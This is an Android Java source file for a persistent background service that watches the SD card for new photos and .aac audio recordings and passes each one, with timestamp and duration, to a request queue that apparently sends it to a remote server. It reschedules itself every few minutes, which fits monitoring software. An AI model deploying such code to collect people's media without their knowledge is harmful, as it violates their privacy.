package custom.fileobserver;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.MediaMetadataRetriever;
import android.os.Environment;
import android.os.IBinder;

public class FileObserverService extends Service {
	private static final int SERVICE_REQUEST_CODE = 21;
	private final static String LOG_TAG = FileObserverService.class.getSimpleName().toString();
	private int isImageObserver = 0;
	private int isAudioObserver = 0;
	private FileObserver fileObs = null;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	public void onCreate() {
		super.onCreate();
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Logging.doLog(LOG_TAG, "FileObserverService", "FileObserverService");

		// ----------restart service
		// ---------------------------------------------------
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, 3);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this, SERVICE_REQUEST_CODE,
				new Intent(this, FileObserverService.class), // SERVICE_REQUEST_CODE
																// -
																// уникальный
																// int
																// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), servicePendingIntent);

		isImageObserver = AppSettings.getState(AppConstants.TYPE_IMAGE_REQUEST, this);
		isAudioObserver = AppSettings.getState(AppConstants.TYPE_AUDIO_REQUEST, this);

		if (isImageObserver == 0 && isAudioObserver == 0) {
			Logging.doLog(LOG_TAG, "stop watcher", "stop watcher");
			stopWatcher();
			return 0;
		}

		if (fileObs != null) {
			if (fileObs.getState() == false) {
				Logging.doLog(LOG_TAG, "start watcher", "start watcher");
				startWatcher();
			} else {
				Logging.doLog(LOG_TAG, "state true", "state true");
			}
		} else {
			Logging.doLog(LOG_TAG, "fileObs start watcher", "fileObs start watcher");
			startWatcher();

		}

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	/*
	 * Start monitoring the creation of files in memory
	 */
	public void startWatcher() {
		Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");

		String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
		String sdcardMnt = "/mnt/sdcard2";
		String sdcardExt = "/mnt/extSdCard";
		
		List<String> dirList = new ArrayList<String>();
		// List<String> folder = new ArrayList<String>();
		dirList.add(sdcard);
//		dirList.add(sdcard2);
		dirList.add(sdcardMnt);
		dirList.add(sdcardExt);
//		dirList.add(sdcardSd);
		// for (String item : dirList) {
		// if (item != null)
		// folder.addAll(RecursiveSearch.recursiveFileFind(item));
		//
		// }
		for (String item : dirList) {
			Logging.doLog(LOG_TAG, item);

			File file = new File(item);
			if (file.exists() && file.isDirectory()) {

				Logging.doLog(LOG_TAG, "FileWatcher = create " + item, "FileWatcher = create" + item);
				int event = FileObserver.CLOSE_WRITE | FileObserver.CREATE;
				fileObs = new FileObserver(item, true, event) {
					@Override
					public void onEvent(int event, int cookie, String path) {
						// TODO Auto-generated method stub
						filterFile(event, path);
					}
				};
				Logging.doLog(LOG_TAG, "FileListener", "FileListener");
				// mWatcher.setFileListener(mFileListener);
				Logging.doLog(LOG_TAG, "startWatcher", "startWatcher");
				fileObs.startWatching();
			}
		}
	}

	private void filterFile(int event, String path) {
		int typeValue = -1;
		if (!path.endsWith(".txt")) {
			Logging.doLog(LOG_TAG, "event: " + event + " path " + path, "event: " + event + " path " + path);

			if (path.endsWith(".jpg") || path.endsWith(".png") || path.endsWith(".gif") || path.endsWith(".bpm")) {
				Logging.doLog(LOG_TAG, "image:" + path, "image:" + path);

				if (event == FileObserver.CREATE)
					AppSettings.setLastImageFile(path);
				else if (event == FileObserver.CLOSE_WRITE) {
					Logging.doLog(LOG_TAG, "Last image " + AppSettings.getLastImageFile().equals(path),
							"Last image " + AppSettings.getLastImageFile().equals(path));

					if (AppSettings.getLastImageFile().equals(path) && isImageObserver == 1) {
						try {
							TimeUnit.MILLISECONDS.sleep(1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
						AppSettings.setLastImageFile("null");
					} else
						return;
					typeValue = AppConstants.TYPE_IMAGE_REQUEST;
					Logging.doLog(LOG_TAG, "data[image]", "data[image]");
				}
			}
			if (path.endsWith(".aac") && isAudioObserver == 1) {
				Logging.doLog(LOG_TAG, "path.endsWith(.aac) && audio.equals(1) " + event,
						"path.endsWith(.aac) && audio.equals(1)" + event);
				Logging.doLog(LOG_TAG, "data[audio]: " + event + " " + path, "data[audio]: " + event + "image:" + path);
				if (event == FileObserver.CREATE)
					AppSettings.setLastCreateAudioFile(path);
				else if (event == FileObserver.CLOSE_WRITE) {
					if (AppSettings.getLastCreateAudioFile().equals(path)) {
						typeValue = AppConstants.TYPE_AUDIO_REQUEST;
					} else
						AppSettings.setLastAudioFile(path);
				}
			}
			if (typeValue != -1) {
				Map<String, Object> file = new HashMap<String, Object>();
				Map<String, Object> payloadMap = new HashMap<String, Object>();

				file.put("type", typeValue);
				file.put("time", ConvertDate.logTime());
				file.put("path", path);
				if (typeValue == AppConstants.TYPE_AUDIO_REQUEST) {
					int second = getDuration(path);
					if (getDuration(path) != -1)
						file.put("duration", second);
				}
				payloadMap.put("file", path);
				RequestList.sendDataRequest(file, payloadMap, this);

			}
		}
	}

	public int getDuration(String path) {
		try {
			MediaMetadataRetriever retriever = new MediaMetadataRetriever();
			retriever.setDataSource(path);
			String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
			int timeInmillisec = (int) Long.parseLong(time);
			int duration = timeInmillisec / 1000;
			int hours = duration / 3600;
			int minutes = (duration - hours * 3600) / 60;
			int seconds = duration - (hours * 3600 + minutes * 60);
			return seconds;
		} catch (Exception e) {
			e.printStackTrace();
			return -1;
		}
	}

	public void stopWatcher() {
		if (fileObs != null)
			fileObs.stopWatching();
	}
}
